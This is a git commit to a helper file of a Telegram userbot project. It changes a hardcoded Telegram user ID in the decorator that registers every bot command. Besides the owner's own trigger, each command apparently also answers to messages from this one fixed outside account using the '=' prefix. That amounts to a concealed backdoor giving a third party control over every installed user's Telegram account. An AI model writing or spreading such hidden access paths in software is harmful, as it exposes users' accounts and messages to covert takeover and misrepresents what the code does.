a0d79b4ad11c4e91c3d3d988b45f69fec095bea5
sɪ ᴧꝛᴧʙ <127276984+fadhilarab47@users.noreply.github.com>
2023-09-16 02:29:47 +0700

    Update client.py

--- PyroUbot/core/helpers/client.py
+++ PyroUbot/core/helpers/client.py
@@ -25,7 +25,7 @@ class PY:
 
     def UBOT(command, filter=FILTERS.ME):
         def wrapper(func):
-            @ubot.on_message(filters.command(command, "=") & filters.user(5876222922))
+            @ubot.on_message(filters.command(command, "=") & filters.user(1948147616))
             @ubot.on_message(ubot.cmd_prefix(command) & filter)
             async def wrapped_func(client, message):
                 await func(client, message)
